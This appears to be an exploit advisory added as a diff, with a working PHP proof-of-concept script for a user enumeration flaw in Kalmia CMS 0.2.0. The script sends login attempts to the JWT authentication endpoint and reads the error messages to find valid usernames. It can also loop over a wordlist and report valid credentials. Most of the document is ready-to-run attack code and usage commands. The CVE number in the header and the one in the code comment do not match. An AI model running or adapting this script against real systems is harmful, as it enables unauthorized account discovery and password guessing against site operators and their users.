@@ -1,0 +1,145 @@
+=============================================================================================================================================
+| # Title     : Kalmia CMS 0.2.0 User Enumeration via JWT Auth API                                                                          |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://kalmia.difuse.io/doc/                                                                                               |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212443/ &		CVE-2025-65899
+
+[+] Summary : The JWT authentication endpoint leaks whether a user exists based on the returned JSON "message". 
+
+[+] The API returns:
+
+ "user_not_found"            => invalid username
+ "invalid_password"          => valid username but wrong password
+ "200 OK"                    => valid credentials
+
+[+] This PoC performs username brute-force enumeration using this flaw.
+
+Usage:
+  php poc.php URL -u user -p pass
+  php poc.php URL -w wordlist.txt -p pass
+
+====================================================================
+Saving:
+  Save the PHP PoC as: poc.php
+
+Running:
+  php poc.php http://target:2727 -u admin -p 123456
+  php poc.php http://target:2727 -w users.txt -p 123456
+
+[+]  POC : 
+
+<?php
+/*
+ * Kalmia CMS v0.2.0 – User Enumeration – CVE‑2025‑65900
+ * by Indoushka
+ */
+
+if ($argc < 2) {
+    die("Usage:
+  php $argv[0] URL -u user -p pass
+  php $argv[0] URL -w wordlist.txt -p pass\n");
+}
+
+$url        = $argv[1];
+$username   = null;
+$password   = null;
+$wordlist   = null;
+
+for ($i = 2; $i < $argc; $i++) {
+    if ($argv[$i] === "-u" && isset($argv[$i+1])) $username = $argv[++$i];
+    elseif ($argv[$i] === "-p" && isset($argv[$i+1])) $password = $argv[++$i];
+    elseif ($argv[$i] === "-w" && isset($argv[$i+1])) $wordlist = $argv[++$i];
+}
+
+function http_post($full_url, $payload) {
+    $opts = [
+        "http" => [
+            "method"  => "POST",
+            "header"  =>
+                "Content-Type: application/json\r\n" .
+                "User-Agent: Mozilla/5.0\r\n",
+            "content" => json_encode($payload),
+            "timeout" => 30
+        ]
+    ];
+    return @file_get_contents($full_url, false, stream_context_create($opts));
+}
+
+function checkCredentials($base, $user, $pass) {
+    $endpoint = "/kal-api/auth/jwt/create";
+    $full_url = rtrim($base, "/") . $endpoint;
+
+    $response = http_post($full_url, [
+        "username" => $user,
+        "password" => $pass
+    ]);
+
+    if ($response === false) return "connection_error";
+
+    $json = json_decode($response, true);
+    if (!is_array($json)) return "invalid_response";
+
+    if (isset($json["refresh"]))         return "valid_credentials";
+    if (($json["message"] ?? "") === "user_not_found")   return "user_not_found";
+    if (($json["message"] ?? "") === "invalid_password") return "invalid_password";
+
+    return "unknown_error";
+}
+
+echo "\n===============================================================\n";
+echo "[*] Target Base: $url\n";
+echo "===============================================================\n";
+
+if ($username && $password) {
+    $result = checkCredentials($url, $username, $password);
+    if ($result === "valid_credentials")
+        echo "[+] Valid Credentials: $username:$password\n";
+    elseif ($result === "invalid_password")
+        echo "[+] Valid User: $username\n";
+    elseif ($result === "user_not_found")
+        echo "[-] User does not exist: $username\n";
+    else
+        echo "[-] Error: $result\n";
+
+    exit;
+}
+
+if ($wordlist && $password) {
+    if (!file_exists($wordlist))
+        die("Wordlist file not found: $wordlist\n");
+
+    $users = file($wordlist, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    echo "[*] Starting enumeration for " . count($users) . " users...\n\n";
+
+    $valid_users = [];
+    foreach ($users as $u) {
+        $result = checkCredentials($url, $u, $password);
+
+        if ($result === "invalid_password") {
+            echo "[+] Valid user found: $u\n";
+            $valid_users[] = $u;
+        } elseif ($result === "valid_credentials") {
+            echo "[+] Valid credentials: $u:$password\n";
+        }
+    }
+
+    if ($valid_users)
+        echo "\n[+] Summary – Valid users: " . implode(", ", $valid_users) . "\n";
+    else
+        echo "[-] No valid users found\n";
+
+    exit;
+}
+
+echo "Error: Missing parameters.\n";
+exit;
+?>
+
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
